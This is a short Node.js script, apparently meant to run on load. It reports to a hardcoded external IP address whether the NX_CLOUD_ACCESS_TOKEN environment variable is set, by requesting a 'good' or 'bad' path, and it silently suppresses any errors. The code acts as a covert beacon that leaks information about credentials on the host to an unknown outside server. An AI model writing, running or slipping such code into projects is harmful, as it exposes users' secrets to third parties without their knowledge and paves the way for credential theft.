const axios = require('axios');

(async () => {
  try {
    await axios.get(`http://194.135.88.67:9990/${(process.env.NX_CLOUD_ACCESS_TOKEN === undefined || process.env.NX_CLOUD_ACCESS_TOKEN === "") ? "good" : "bad"}`); //
  } catch (error) {
  }
})();